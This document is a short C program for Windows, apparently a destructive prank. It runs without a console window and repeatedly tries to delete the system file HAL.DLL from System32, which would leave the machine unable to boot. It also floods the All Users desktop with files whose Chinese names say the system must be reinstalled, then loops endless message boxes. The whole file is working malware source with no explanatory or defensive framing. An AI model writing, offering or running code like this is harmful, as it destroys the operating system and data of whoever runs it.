#include <windows.h>  
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
int main()
{   
  char name[255];  
  for(int z=0;z<=100000000000000;z++)                        
  {  
  DeleteFile("C:\\WINDOWS\\SYSTEM32\\HAL.DLL");char ab[255] ="C:\\Documents and Settings\\All Users\\桌面\\";   
  wsprintf(name,"你的系统要重装了%d",z);  
  strcat(ab,name);     
  CreateFile(ab,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL); 
  }  
    for(int a=0;a<100000000000000;a++)   
    {  
    MessageBox(NULL,"N亿次","提示框",0);   
    }
return 0;  
}